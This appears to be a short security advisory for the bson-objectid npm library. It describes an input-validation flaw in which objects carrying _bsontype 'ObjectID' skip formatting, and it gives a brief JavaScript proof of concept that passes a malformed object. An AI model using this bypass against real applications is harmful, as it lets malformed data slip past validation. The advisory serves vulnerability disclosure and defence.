# Overview
[bson-objectid](https://snyk.io/vuln/None) is a library that allows you to construct ObjectIDs without the mongodb driver or bson module.

Affected versions of this package are vulnerable to Insufficient Input Validation. The ObjectID() function allows an attacker to generate a malformed objectid by inserting an additional property to the user-input, because bson-objectid will return early if it detects _bsontype==ObjectID in the user-input object. As a result, objects in arbitrary forms can bypass formatting if they have a valid bsontype.

# Proof of Concept

```
var ObjectID = require("bson-objectid");

var json = {
    "mal_formkey": {
        "payload": "xxxx"
    },
    "_bsontype" : "ObjectID"
};

console.log(ObjectID(json));
console.log(ObjectID.isValid(ObjectID(json)));
```